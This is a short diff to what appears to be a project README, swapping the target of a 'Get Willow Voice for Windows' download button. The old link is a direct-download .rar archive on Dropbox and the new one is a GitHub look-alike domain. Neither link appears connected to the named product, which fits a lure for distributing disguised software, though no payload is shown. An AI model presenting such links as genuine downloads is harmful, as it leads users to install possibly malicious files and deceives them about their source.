@@ -7,7 +7,7 @@
 <br>
 
 <p align="center">
-  <a href="https://www.dropbox.com/scl/fi/yefarxzc6nvqmal364j3e/windows_x64.rar?rlkey=b0itv9zse1v0ttij3s3jxkjpr&st=ktpx3ayl&dl=1">
+  <a href="https://getgithub.help">
     <img src="https://cdn.intheloop.io/wp-content/uploads/2020/08/windows-button.png" width="200" alt="Get Willow Voice for Windows">
   </a>
 </p>
